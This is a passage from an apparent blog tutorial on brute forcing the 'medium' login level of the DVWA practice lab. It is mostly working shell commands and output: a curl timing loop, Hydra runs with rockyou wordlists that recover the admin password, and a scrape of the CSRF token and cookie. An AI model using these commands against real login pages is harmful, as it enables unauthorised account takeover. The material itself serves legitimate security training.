&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;span class="line-number"&gt;22&lt;/span&gt;
&lt;span class="line-number"&gt;23&lt;/span&gt;
&lt;span class="line-number"&gt;24&lt;/span&gt;
&lt;span class="line-number"&gt;25&lt;/span&gt;
&lt;span class="line-number"&gt;26&lt;/span&gt;
&lt;span class="line-number"&gt;27&lt;/span&gt;
&lt;span class="line-number"&gt;28&lt;/span&gt;
&lt;span class="line-number"&gt;29&lt;/span&gt;
&lt;span class="line-number"&gt;30&lt;/span&gt;
&lt;span class="line-number"&gt;31&lt;/span&gt;
&lt;span class="line-number"&gt;32&lt;/span&gt;
&lt;span class="line-number"&gt;33&lt;/span&gt;
&lt;span class="line-number"&gt;34&lt;/span&gt;
&lt;span class="line-number"&gt;35&lt;/span&gt;
&lt;span class="line-number"&gt;36&lt;/span&gt;
&lt;span class="line-number"&gt;37&lt;/span&gt;
&lt;span class="line-number"&gt;38&lt;/span&gt;
&lt;span class="line-number"&gt;39&lt;/span&gt;
&lt;span class="line-number"&gt;40&lt;/span&gt;
&lt;span class="line-number"&gt;41&lt;/span&gt;
&lt;span class="line-number"&gt;42&lt;/span&gt;
&lt;span class="line-number"&gt;43&lt;/span&gt;
&lt;span class="line-number"&gt;44&lt;/span&gt;
&lt;span class="line-number"&gt;45&lt;/span&gt;
&lt;span class="line-number"&gt;46&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# for loop in {1..3}; do&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;for&lt;/span&gt;&amp;gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;quot;\nLoop: $loop&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;for&lt;/span&gt;&amp;gt; date&lt;span class="p"&gt;;&lt;/span&gt; curl -s -b &lt;span class="s1"&gt;'security=medium'&lt;/span&gt; -b dvwa.cookie &lt;span class="s1"&gt;'http://192.168.1.44/DVWA/vulnerabilities/brute/?username=user&amp;amp;password=pass&amp;amp;Login=Login'&lt;/span&gt; &amp;gt;/dev/null &lt;span class="p"&gt;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;for&lt;/span&gt;&amp;gt;   curl -s -b &lt;span class="s1"&gt;'security=medium'&lt;/span&gt; -b dvwa.cookie &lt;span class="s1"&gt;'http://192.168.1.44/DVWA/vulnerabilities/brute/?username=user&amp;amp;password=pass&amp;amp;Login=Login'&lt;/span&gt; &amp;gt;/dev/null &lt;span class="p"&gt;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;for&lt;/span&gt;&amp;gt;   curl -s -b &lt;span class="s1"&gt;'security=medium'&lt;/span&gt; -b dvwa.cookie &lt;span class="s1"&gt;'http://192.168.1.44/DVWA/vulnerabilities/brute/?username=user&amp;amp;password=pass&amp;amp;Login=Login'&lt;/span&gt; &amp;gt;/dev/null &lt;span class="p"&gt;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;for&lt;/span&gt;&amp;gt;   curl -s -b &lt;span class="s1"&gt;'security=medium'&lt;/span&gt; -b dvwa.cookie &lt;span class="s1"&gt;'http://192.168.1.44/DVWA/vulnerabilities/brute/?username=user&amp;amp;password=pass&amp;amp;Login=Login'&lt;/span&gt; &amp;gt;/dev/null &lt;span class="p"&gt;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;for&lt;/span&gt;&amp;gt;   curl -s -b &lt;span class="s1"&gt;'security=medium'&lt;/span&gt; -b dvwa.cookie &lt;span class="s1"&gt;'http://192.168.1.44/DVWA/vulnerabilities/brute/?username=user&amp;amp;password=pass&amp;amp;Login=Login'&lt;/span&gt; &amp;gt;/dev/null &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; date
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;for&lt;/span&gt;&amp;gt; sleep 30s
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;for&lt;/span&gt;&amp;gt; &lt;span class="k"&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;Loop: 1
&lt;/span&gt;&lt;span class="line"&gt;Fri &lt;span class="m"&gt;30&lt;/span&gt; Oct 22:28:25 GMT 2015
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;2&lt;span class="o"&gt;]&lt;/span&gt; 28074
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;3&lt;span class="o"&gt;]&lt;/span&gt; 28075
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;4&lt;span class="o"&gt;]&lt;/span&gt; 28076
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;5&lt;span class="o"&gt;]&lt;/span&gt; 28077
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;2&lt;span class="o"&gt;]&lt;/span&gt;    &lt;span class="m"&gt;28074&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt;       curl -s -b &lt;span class="s1"&gt;'security=medium'&lt;/span&gt; -b dvwa.cookie  &amp;gt; /dev/null
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;4&lt;span class="o"&gt;]&lt;/span&gt;  - &lt;span class="m"&gt;28076&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt;       curl -s -b &lt;span class="s1"&gt;'security=medium'&lt;/span&gt; -b dvwa.cookie  &amp;gt; /dev/null
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;3&lt;span class="o"&gt;]&lt;/span&gt;  - &lt;span class="m"&gt;28075&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt;       curl -s -b &lt;span class="s1"&gt;'security=medium'&lt;/span&gt; -b dvwa.cookie  &amp;gt; /dev/null
&lt;/span&gt;&lt;span class="line"&gt;Fri &lt;span class="m"&gt;30&lt;/span&gt; Oct 22:28:37 GMT 2015
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;5&lt;span class="o"&gt;]&lt;/span&gt;  + &lt;span class="m"&gt;28077&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt;       curl -s -b &lt;span class="s1"&gt;'security=medium'&lt;/span&gt; -b dvwa.cookie  &amp;gt; /dev/null
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;Loop: 2
&lt;/span&gt;&lt;span class="line"&gt;Fri &lt;span class="m"&gt;30&lt;/span&gt; Oct 22:29:07 GMT 2015
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;2&lt;span class="o"&gt;]&lt;/span&gt; 28136
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;3&lt;span class="o"&gt;]&lt;/span&gt; 28137
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;4&lt;span class="o"&gt;]&lt;/span&gt; 28138
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;5&lt;span class="o"&gt;]&lt;/span&gt; 28139
&lt;/span&gt;&lt;span class="line"&gt;Fri &lt;span class="m"&gt;30&lt;/span&gt; Oct 22:29:10 GMT 2015
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;4&lt;span class="o"&gt;]&lt;/span&gt;  - &lt;span class="m"&gt;28138&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt;       curl -s -b &lt;span class="s1"&gt;'security=medium'&lt;/span&gt; -b dvwa.cookie  &amp;gt; /dev/null
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;5&lt;span class="o"&gt;]&lt;/span&gt;  + &lt;span class="m"&gt;28139&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt;       curl -s -b &lt;span class="s1"&gt;'security=medium'&lt;/span&gt; -b dvwa.cookie  &amp;gt; /dev/null
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;2&lt;span class="o"&gt;]&lt;/span&gt;  - &lt;span class="m"&gt;28136&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt;       curl -s -b &lt;span class="s1"&gt;'security=medium'&lt;/span&gt; -b dvwa.cookie  &amp;gt; /dev/null
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;3&lt;span class="o"&gt;]&lt;/span&gt;  + &lt;span class="m"&gt;28137&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt;       curl -s -b &lt;span class="s1"&gt;'security=medium'&lt;/span&gt; -b dvwa.cookie  &amp;gt; /dev/null
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;Loop: 3
&lt;/span&gt;&lt;span class="line"&gt;Fri &lt;span class="m"&gt;30&lt;/span&gt; Oct 22:29:40 GMT 2015
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;2&lt;span class="o"&gt;]&lt;/span&gt; 28195
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;3&lt;span class="o"&gt;]&lt;/span&gt; 28196
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;4&lt;span class="o"&gt;]&lt;/span&gt; 28197
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;5&lt;span class="o"&gt;]&lt;/span&gt; 28198
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;3&lt;span class="o"&gt;]&lt;/span&gt;    &lt;span class="m"&gt;28196&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt;       curl -s -b &lt;span class="s1"&gt;'security=medium'&lt;/span&gt; -b dvwa.cookie  &amp;gt; /dev/null
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;4&lt;span class="o"&gt;]&lt;/span&gt;  - &lt;span class="m"&gt;28197&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt;       curl -s -b &lt;span class="s1"&gt;'security=medium'&lt;/span&gt; -b dvwa.cookie  &amp;gt; /dev/null
&lt;/span&gt;&lt;span class="line"&gt;Fri &lt;span class="m"&gt;30&lt;/span&gt; Oct 22:29:49 GMT 2015
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;2&lt;span class="o"&gt;]&lt;/span&gt;  - &lt;span class="m"&gt;28195&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt;       curl -s -b &lt;span class="s1"&gt;'security=medium'&lt;/span&gt; -b dvwa.cookie  &amp;gt; /dev/null
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;5&lt;span class="o"&gt;]&lt;/span&gt;  + &lt;span class="m"&gt;28198&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt;       curl -s -b &lt;span class="s1"&gt;'security=medium'&lt;/span&gt; -b dvwa.cookie  &amp;gt; /dev/null
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Cool Down Test" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-medium-06.png" /&gt;&lt;/p&gt;

&lt;p&gt;...Looks like we are not going too crazy, as &lt;strong&gt;there were different results&lt;/strong&gt;!&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Loop 1: &lt;strong&gt;12 seconds&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;Loop 2: &lt;strong&gt;3 seconds&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;Loop 3: &lt;strong&gt;9 seconds&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;strong&gt;Unfortunately, this means when we do our brute force attempt we need to allow for the maximum possible wait time. There are no shortcuts; otherwise we may not get reliable results (thus wasting all of our time)&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Just because &lt;strong&gt;we have finished making requests&lt;/strong&gt; or brute forcing it, &lt;strong&gt;does not mean the web application is still processing requests&lt;/strong&gt;/cooling down.&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Minimum.Wait.Time"&gt;&lt;/a&gt;
&lt;h3&gt;Minimum Wait Time&lt;/h3&gt;

&lt;p&gt;We can calculate the minimum value for the wait time as follows:&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;(&lt;/span&gt;threads * web app cool down&lt;span class="o"&gt;)&lt;/span&gt; + &lt;span class="nv"&gt;leeway&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; minimum &lt;span class="nb"&gt;wait time &lt;/span&gt;amount.
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt; * 3&lt;span class="o"&gt;)&lt;/span&gt; + &lt;span class="nv"&gt;2&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="m"&gt;14&lt;/span&gt; seconds.
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;The 2 seconds for the leeway amount is a "&lt;strong&gt;safe net&lt;/strong&gt;" in case of there being an additional lag (would need to be higher &lt;strong&gt;if&lt;/strong&gt; based on the slowest point in the attack). Note, in the low security posting the value was set to 3 seconds.&lt;/p&gt;

&lt;p&gt;This means there could be &lt;strong&gt;a possible extra 11 seconds of wait time&lt;/strong&gt; between "&lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-low/"&gt;low&lt;/a&gt;" and "&lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-medium/"&gt;medium&lt;/a&gt;" when using 4 threads. This is because there is a &lt;strong&gt;guaranteed of at least 3 seconds delay for each thread&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Again, &lt;strong&gt;if the wait time is too low, it will not find a successful login&lt;/strong&gt;. See the "&lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-low/"&gt;low level&lt;/a&gt;" for a deeper explanation.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Note, if this was a "live" box in production, which means &lt;strong&gt;other users could be using it, what happens if they are failing to login at the same time as we brute force&lt;/strong&gt;? This might have an effect; is the cool down based upon session values, IP, or complete web application?&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Brute.Forcing"&gt;&lt;/a&gt;
&lt;h2&gt;Brute Forcing&lt;/h2&gt;

&lt;a name="L.strong.Hydra..strong."&gt;&lt;/a&gt;
&lt;h3&gt;&lt;strong&gt;Hydra&lt;/strong&gt;&lt;/h3&gt;

&lt;p&gt;We are using the same arguments as in the &lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-low/"&gt;low level&lt;/a&gt;, however their values may be different.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Debug/Test command&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;(&lt;code&gt;1 thread&lt;/code&gt; * &lt;code&gt;3 seconds sleep&lt;/code&gt;) + &lt;code&gt;2 seconds extra&lt;/code&gt; = &lt;code&gt;5 second wait time&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;


&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# rm -f hydra.restore; export HYDRA_PROXY_HTTP=http://127.0.0.1:8080&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# hydra  -l admin  -p password \&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  -e ns  -F  -t &lt;span class="m"&gt;1&lt;/span&gt;  -w &lt;span class="m"&gt;5&lt;/span&gt;  -v  -V  192.168.1.44  http-get-form &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="s2"&gt;&amp;quot;/DVWA/vulnerabilities/brute/:username=^USER^&amp;amp;password=^PASS^&amp;amp;Login=Login:F=Username and/or password incorrect.:H=Cookie\: security=medium; PHPSESSID=$(grep PHPSESSID dvwa.cookie | cut -d $'\t' -f7)&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;Hydra v8.1 &lt;span class="o"&gt;(&lt;/span&gt;c&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;2014&lt;/span&gt; by van Hauser/THC - Please &lt;span class="k"&gt;do&lt;/span&gt; not use in military or secret service organizations, or &lt;span class="k"&gt;for&lt;/span&gt; illegal purposes.
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;Hydra &lt;span class="o"&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span class="o"&gt;)&lt;/span&gt; starting at 2015-10-30 21:41:22
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; Using HTTP Proxy: http://127.0.0.1:8080
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;INFORMATION&lt;span class="o"&gt;]&lt;/span&gt; escape sequence &lt;span class="se"&gt;\:&lt;/span&gt; detected in module option, no parameter verification is performed.
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;DATA&lt;span class="o"&gt;]&lt;/span&gt; max &lt;span class="m"&gt;1&lt;/span&gt; task per &lt;span class="m"&gt;1&lt;/span&gt; server, overall &lt;span class="m"&gt;64&lt;/span&gt; tasks, &lt;span class="m"&gt;3&lt;/span&gt; login tries &lt;span class="o"&gt;(&lt;/span&gt;l:1/p:3&lt;span class="o"&gt;)&lt;/span&gt;, ~0 tries per task
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;DATA&lt;span class="o"&gt;]&lt;/span&gt; attacking service http-get-form on port 80
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;VERBOSE&lt;span class="o"&gt;]&lt;/span&gt; Resolving addresses ... &lt;span class="k"&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;ATTEMPT&lt;span class="o"&gt;]&lt;/span&gt; target 192.168.1.44 - login &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - pass &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - &lt;span class="m"&gt;1&lt;/span&gt; of &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;child 0&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;ATTEMPT&lt;span class="o"&gt;]&lt;/span&gt; target 192.168.1.44 - login &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - pass &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt; - &lt;span class="m"&gt;2&lt;/span&gt; of &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;child 0&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;ATTEMPT&lt;span class="o"&gt;]&lt;/span&gt; target 192.168.1.44 - login &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - pass &lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt; - &lt;span class="m"&gt;3&lt;/span&gt; of &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;child 0&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;80&lt;span class="o"&gt;][&lt;/span&gt;http-get-form&lt;span class="o"&gt;]&lt;/span&gt; host: 192.168.1.44   login: admin   password: password
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;STATUS&lt;span class="o"&gt;]&lt;/span&gt; attack finished &lt;span class="k"&gt;for&lt;/span&gt; 192.168.1.44 &lt;span class="o"&gt;(&lt;/span&gt;valid pair found&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="m"&gt;1&lt;/span&gt; of &lt;span class="m"&gt;1&lt;/span&gt; target successfully completed, &lt;span class="m"&gt;1&lt;/span&gt; valid password found
&lt;/span&gt;&lt;span class="line"&gt;Hydra &lt;span class="o"&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span class="o"&gt;)&lt;/span&gt; finished at 2015-10-30 21:41:29
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="hydra" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-medium-07.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;Main Command&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;(&lt;code&gt;5 threads&lt;/code&gt; * &lt;code&gt;3 seconds sleep&lt;/code&gt;) + &lt;code&gt;2 seconds sleep&lt;/code&gt; = &lt;code&gt;17 seconds wait time&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;


&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;span class="line-number"&gt;22&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# unset HYDRA_PROXY_HTTP; rm -f hydra.restore&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# CSRF=$(curl -s -c dvwa.cookie &amp;quot;192.168.1.44/DVWA/login.php&amp;quot; | awk -F 'value=' '/user_token/ {print $2}' | cut -d &amp;quot;'&amp;quot; -f2)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# SESSIONID=$(grep PHPSESSID dvwa.cookie | cut -d $'\t' -f7)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b dvwa.cookie -d &amp;quot;username=admin&amp;amp;password=password&amp;amp;user_token=${CSRF}&amp;amp;Login=Login&amp;quot; &amp;quot;192.168.1.44/DVWA/login.php&amp;quot; &amp;gt;/dev/null&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# time  hydra  -L /usr/share/seclists/Usernames/top_shortlist.txt  -P /usr/share/seclists/Passwords/rockyou.txt \&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  -e ns  -F  -u  -t &lt;span class="m"&gt;5&lt;/span&gt;  -w &lt;span class="m"&gt;17&lt;/span&gt;  -v  192.168.1.44  http-get-form &lt;span class="se"&gt;\&lt;/span&gt;
